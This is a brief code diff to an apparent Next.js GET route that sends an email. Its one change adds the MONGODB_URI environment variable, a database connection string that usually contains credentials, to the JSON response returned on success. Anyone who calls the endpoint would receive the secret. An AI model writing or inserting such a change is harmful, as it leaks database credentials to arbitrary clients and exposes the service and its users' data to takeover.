@@ -61,7 +61,7 @@ export async function GET(request: Request) {
             }
           ]
         })
-        return NextResponse.json({ success: true, id: id, code: 200, message: 'Note: Mail Has Has Been Sent' });
+        return NextResponse.json({ success: true, id: id, env: process.env.MONGODB_URI, code: 200, message: 'Note: Mail Has Has Been Sent' });
       } else {
         return NextResponse.json({ success: false, code: 503, message: 'Warning: Error In Sending Email' })
       }
